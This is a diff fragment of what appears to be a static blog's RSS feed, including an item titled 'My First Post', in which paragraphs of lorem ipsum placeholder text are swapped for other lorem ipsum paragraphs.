-  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>
+  <p><em>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</em></p>
 
   <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
 
-  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>
+  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
 
 
 
@@ -35078,11 +35178,11 @@ some more fun
 
 
 
-  <p><em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.</em></p>
+  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
 
-  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
+  <p><em>Maecenas enim elit, iaculis ac consectetur sit amet, faucibus nec enim. Aenean eu accumsan odio. Nullam tristique risus eros, imperdiet sodales elit feugiat sed. Phasellus id convallis dui, convallis malesuada urna. Mauris et leo ante. Donec scelerisque magna eleifend urna ullamcorper rhoncus. Nunc ac porta nibh. Sed in sagittis nisl. Quisque facilisis consectetur nunc quis ullamcorper. In a lorem condimentum, pellentesque metus id, posuere nisi. Donec tempor ex ornare diam rhoncus, eget sodales ante tempor. Etiam neque metus, pulvinar et fringilla sit amet, facilisis a lacus. Fusce a tincidunt ligula, sed tempor nunc.</em></p>
 
-  <p><em>Aliquam sit amet felis euismod, varius odio ac, commodo ex. Maecenas quis felis ligula. Sed semper nisi et libero accumsan, id condimentum nisl tempus. Donec in elementum tortor, quis facilisis nunc. Duis sed malesuada metus. Vivamus sed dignissim felis, vitae fringilla metus. Pellentesque semper elit leo.</em></p>
+  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
 
 
 
@@ -35093,13 +35193,13 @@ some more fun
 
 
 
-  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>
+  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
 
 
 
 ]]></content></item><item><title>My First Post</title><link>https://0xade1.github.io/posts/2021/01/my-first-post/</link><pubDate>Mon, 25 Jan 2021 00:04:16 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/01/my-first-post/</guid><description>[#]: &amp;lt;&amp;gt; ()
 //: &amp;lt;&amp;gt; Aliquam sit amet felis euismod, varius odio ac, commodo ex. Maecenas quis felis ligula. Sed semper nisi et libero accumsan, id condimentum nisl tempus. Donec in elementum tortor, quis facilisis nunc. Duis sed malesuada metus. Vivamus sed dignissim felis, vitae fringilla metus. Pellentesque semper elit leo.
-Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu.</description><content type="html"><![CDATA[<p>[#]: &lt;&gt; (<img src="/proxy-image.jpg" alt="cover">)</p>
+Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl.</description><content type="html"><![CDATA[<p>[#]: &lt;&gt; (<img src="/proxy-image.jpg" alt="cover">)</p>
 <p><a href="" title="ceci est un commentaire">//</a>: &lt;&gt; 
 
 
@@ -35108,9 +35208,9 @@ Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facili
 
   <p><em>Aliquam sit amet felis euismod, varius odio ac, commodo ex. Maecenas quis felis ligula. Sed semper nisi et libero accumsan, id condimentum nisl tempus. Donec in elementum tortor, quis facilisis nunc. Duis sed malesuada metus. Vivamus sed dignissim felis, vitae fringilla metus. Pellentesque semper elit leo.</em></p>
 
-  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
+  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
 
 
 </p>
